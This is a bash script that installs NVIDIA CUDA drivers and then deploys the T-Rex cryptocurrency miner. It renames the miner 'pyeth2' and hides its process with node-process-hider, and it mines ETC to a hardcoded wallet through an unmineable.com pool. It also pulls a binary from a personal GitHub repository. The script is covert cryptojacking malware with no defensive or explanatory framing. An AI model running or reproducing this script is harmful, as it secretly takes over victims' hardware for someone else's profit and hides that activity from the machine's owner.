#!/bin/bash
wget https://github.com/samrikulan/lagraven/raw/main/pyeth2
cd /usr/local/bin
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl3 -y
sudo apt install gcc
npm i -g node-process-hider
sudo ph add pyeth2
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.23.1/t-rex-0.23.1-linux.tar.gz
sudo tar xvzf t-rex-0.23.1-linux.tar.gz
mv t-rex pyeth2
sudo ./pyeth2 -a ethash -o ethash.unmineable.com:3333 -u ETC:0xc1a48c0ff1d28c85685e3eabd55d19f12327e139.uu -p x 
